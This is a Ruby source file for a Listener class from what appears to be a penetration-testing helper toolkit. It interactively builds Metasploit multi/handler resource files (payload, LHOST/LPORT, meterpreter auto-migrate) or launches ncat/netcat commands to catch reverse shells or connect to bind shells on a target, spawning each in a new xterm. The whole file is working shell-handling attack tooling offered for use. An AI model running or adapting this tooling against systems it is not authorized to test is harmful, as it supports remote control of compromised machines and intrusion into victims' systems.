# This is our Listener Class
# I made it into a bit of a all in one wizard walk through setup
# It's easy enough to navigate and doesnt take but a second to do
# Re-write it if you don't like it :p

class Listener
	# MSF Multi/Handler & Generic Ncat/NetCat Connection Setup
	def listener_builder
		print_status("")
		print_status("Welcome to the Listener & Exploit Multi Handler Assistant")
		print_status("")
		payload = payload_selector(1) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		if payload =~ /bind/
			print_caution("Please provide IP for Bind Shell: ")
			zIP=gets.chomp

			print_caution("Please provide PORT for Bind Shell: ")
			zPORT=gets.chomp
			if not payload == 'generic/bind_shell'
				print_status("Launching MSF Exploit/Multi/Handler Connection for #{payload} Binded to #{zIP} on Port #{zPORT} in a new x-window.....")
				f.puts 'use exploit/multi/handler'
				f.puts "set PAYLOAD #{payload}"
				f.puts "set RHOST #{zIP}"
				f.puts 'set LHOST 0.0.0.0'
				f.puts "set LPORT #{zPORT}"
				f.puts 'set ExitOnSession false'
				if payload =~ /meterpeter/
					f.puts 'set AutoRunScript migrate -f'
				end
				f.puts 'exploit -j -z'
				f.close
				givemeshell="xterm -title 'MSF Multi-Handler' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
			else
				print_status("Generic Bind Shell Selected!")
				while(true)
					print_caution("Select how to connect: ")
					print_caution("1) Ncat")
					print_caution("2) NetCat")
					answer=gets.chomp
					if answer.to_i == 1
							givemeshell="xterm -title 'Ncat Connection' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'ncat -v #{zIP} #{zPORT}'\""
							print_status("Launching Ncat Connection to Binded Shell at #{zIP} on Port #{zPORT} in new x-window......")
							break
					elsif answer.to_i == 2
							givemeshell="xterm -title 'NetCat Connection' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'nc -v #{zIP} #{zPORT}'\""
							print_status("Launching NetCat Connection to Binded Shell at #{zIP} on Port #{zPORT} in new x-window......")
							break
						else
							print_error("")
							print_error("Please Enter a Valid Option!")
							print_error("")
					end
				end
			end
		else #Its a reverse shell....
			print_caution("Please provide PORT to listen on: ")
			zPORT=gets.chomp
			if not payload == 'generic/reverse_shell'
				print_status("Launching MSF Exploit/Multi/Handler Listener for #{payload} on Port #{zPORT} in a new x-window.....")
				f.puts 'use exploit/multi/handler'
				f.puts "set PAYLOAD #{payload}"
				f.puts 'set LHOST 0.0.0.0'
				f.puts "set LPORT #{zPORT}"
				f.puts 'set ExitOnSession false'
				if payload =~ /meterpeter/
					f.puts 'set AutoRunScript migrate -f'
				end
				if payload =~ /vncinject/
					f.puts 'set DisableCourtesyShell true'
				end
				f.puts 'exploit -j -z'
				f.close
				givemeshell="xterm -title 'MSF Multi-Handler' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
			else
				print_status("Generic Reverse Shell Selected!")
				while(true)
					print_caution("Select how to catch: ")
					print_caution("1) Ncat")
					print_caution("2) NetCat")
					answer=gets.chomp
					if answer.to_i == 1
							givemeshell="xterm -title 'Ncat Listener' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'ncat -lv #{zPORT}'\""
							print_status("Launching Ncat Listener on Port #{zPORT} in new x-window......")
							break
					elsif answer.to_i == 2
							givemeshell="xterm -title 'NetCat Listener' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'nc -l -v -p #{zPORT}'\""
							print_status("Launching NetCat Listener on Port #{zPORT} in new x-window......")
							break
						else
							print_error("")
							print_error("Please Enter a Valid Option!")
							print_error("")
					end
				end
			end
		end
		#Spawn our listener in a separate terminal cause its nicer that way!!!!!
		fireNforget(givemeshell)
		print_line("")
	end
end
